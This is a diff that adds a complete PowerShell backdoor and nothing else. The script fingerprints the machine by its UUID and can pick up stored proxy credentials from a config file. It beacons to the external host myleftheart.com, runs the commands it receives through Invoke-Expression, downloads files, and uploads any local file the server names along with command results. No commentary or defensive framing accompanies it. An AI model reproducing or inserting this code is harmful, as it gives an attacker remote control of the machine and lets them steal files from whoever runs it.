@@ -1,0 +1,67 @@
+$BBA = "http://" + [System.Net.Dns]::GetHostAddresses("myleftheart.com")
+${global:$CCA} = new-object system.net.WebClient
+$t = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID
+$DDA = $t | %{"atag12" + $_.Replace('-', '') + "1234567890"} | %{$_.substring(0,10)}
+$EEA = $env:PUBLIC+"\Public\files\";
+if(-not(Test-Path $EEA)) {md $EEA}
+$FFA = $EEA+"cfg.ini";
+if(Test-Path $FFA) {
+	$ls = Get-Content  $FFA | Where { $_ -notmatch '^\s+$' }
+	foreach ($l in $ls)
+	{
+		$GGA = $l -split ','
+		if($GGA[0] -eq "srv"){$HHA = $GGA[1] + "";}
+		if($GGA[0] -eq "usr"){$IIA = $GGA[1] + "";}
+		if($GGA[0] -eq "pas"){$JJA = $GGA[1] + "";}
+		if($GGA[0] -eq "prt"){$KKA = $GGA[1] + "";}
+		if($GGA[0] -eq "dom"){$LLA = $GGA[1] + "";}
+	}
+	$u = "http://" + $HHA + ":" + $KKA;
+	$MMA = new-object System.Net.WebProxy($u, $true);
+	$NNA = new-object System.Net.NetworkCredential($IIA, $JJA, $LLA)
+	$MMA.credentials = $NNA
+	${global:$CCA}.proxy = $MMA;
+} else {${global:$CCA}.proxy = [System.Net.WebProxy]::GetDefaultProxy()}
+$r = $true;
+while($r) {
+	$r = $false;
+	$OOA = -join (Get-Random -InputObject (0 .. 9) -Count (%{Get-Random -InputObject (1..9)}))
+	$PPA = $DDA.Insert(5, $OOA)
+	$QQA = ${global:$CCA}.DownloadString("$($BBA)/co/$($PPA)")
+	write-host $QQA
+	$RRA = ""
+	if ($QQA) {
+		$SSA = $QQA.split("<>") | where {$_}
+		$TTA = $SSA[0];
+		$p = $EEA+"$TTA"
+		if($SSA.length -gt 4) {
+			write-host $SSA[1]
+			if ($SSA[2] -ne "not" -and $SSA[2]){
+				write-host $SSA[2];
+				${global:$CCA}.DownloadFile("$BBA/fil/"+$SSA[3], $EEA+$SSA[2]);
+				"File saved in "+$EEA+$SSA[2] | Add-Content $p
+			}
+			if ($SSA[1] -ne "not" -and $SSA[1]){
+				$RRA += $SSA[1]+"<br/>"
+				$rcnt = $SSA[1] | ? { $_.trim() -ne "" }
+				$RRA += $rcnt.Split("&") | foreach-object { Try { $_ | iex | Out-String } Catch { $_ | Out-String} }
+				$RRA+"<>" | Set-Content $p
+				#${global:$CCA}.UploadString("$BBA/res/$PPA$TTA", $RRA);
+			}
+			if ($SSA[4] -ne "not" -and $SSA[4]){
+				write-host $SSA[4]
+				if(Test-Path $SSA[4]) {
+					${global:$CCA}.UploadFile("$BBA/fil/$PPA$TTA", $SSA[4]);
+					"upl<>"+$SSA[4] | Add-Content $p
+				}
+			}
+			if($SSA[$SSA.length -1] -eq "1") {
+				$r = $true;
+			}
+			if($TTA -ne "not" -and $TTA) {
+				${global:$CCA}.UploadFile("$BBA/res/$PPA$TTA", $p);
+				Remove-Item $p -Force
+			}
+		}
+	}
+}
